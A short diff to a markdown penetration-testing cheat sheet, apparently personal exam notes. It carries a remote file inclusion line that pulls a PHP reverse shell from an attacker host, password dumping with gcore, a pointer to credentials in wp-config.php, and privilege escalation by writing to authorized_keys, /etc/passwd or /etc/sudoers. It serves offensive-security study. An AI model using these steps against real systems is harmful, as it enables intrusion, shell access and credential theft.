@@ -138,7 +138,7 @@ RFI: http://url.com/image.php?imd=http://KALI/PHP-reverse-shell.php
 
 
 ```
-Public exploits-> Sometimes, you need to change the payload
+Public exploits-> Sometimes, you need to change the payload (or put some pentestmonkey payload)
 ![image](https://github.com/user-attachments/assets/11a91186-4558-42e7-b5c4-e3c2a0410752)
 
 
@@ -153,6 +153,15 @@ Sudo -l -> gcore -> check running processes for any Password dumping related pro
 Is any of the local binary vulnerable? Sudo vulnerable?
 ```
 
+```
+wp-config.php -> contains credentials
+```
+```
+If we have root file write, check if we can write to 
+- /root/.ssh/authorized_keys
+- /etc/passwd
+- /etc/sudoers
+```
 keepassxc 
 ```
 
